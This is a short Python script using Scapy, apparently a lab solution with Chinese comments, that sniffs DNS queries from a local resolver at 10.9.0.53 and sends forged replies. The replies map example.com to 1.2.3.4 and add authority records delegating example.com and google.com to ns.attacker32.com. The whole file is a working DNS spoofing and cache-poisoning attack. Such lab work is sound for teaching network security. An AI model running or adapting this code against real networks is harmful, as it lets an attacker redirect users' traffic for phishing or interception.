#!/usr/bin/python3
from scapy.all import *
import sys

def spoof_dns(pkt):
	if (DNS in pkt and 'example.com' in pkt[DNS].qd.qname.decode('utf-8')):# 判断是否为查询example.com的DNS请求
		ip  = IP  (dst = pkt[IP].src, src = pkt[IP].dst)
		udp = UDP (dport = pkt[UDP].sport, sport = 53)
		# 构造ANSWER SECTION
		Anssec = DNSRR( rrname = pkt[DNS].qd.qname, 
		                type   = 'A', 
		                rdata  = '1.2.3.4',
		                ttl    = 259200)
		# 构造nameserver服务器相关信息
		NSsec  = DNSRR( rrname = 'example.com', 
		                type   = 'NS',
		                rdata  = 'ns.attacker32.com',
		                ttl    = 259200)
		NSsec1 = DNSRR( rrname = 'google.com', 
				type   = 'NS',
				rdata  = 'ns.attacker32.com',
				ttl    = 259200)             
		dns = DNS( id = pkt[DNS].id, aa=1, rd=0, qr=1,           
			    qdcount=1, qd = pkt[DNS].qd,                 
			    ancount=1, an = Anssec, 
			    nscount=2, ns = NSsec1/NSsec)

		spoofpkt = ip/udp/dns
		send(spoofpkt)

f = 'udp and (src host 10.9.0.53 and dst port 53)'
pkt=sniff(iface='br-c0f5a7acfbe9', filter=f, prn=spoof_dns)
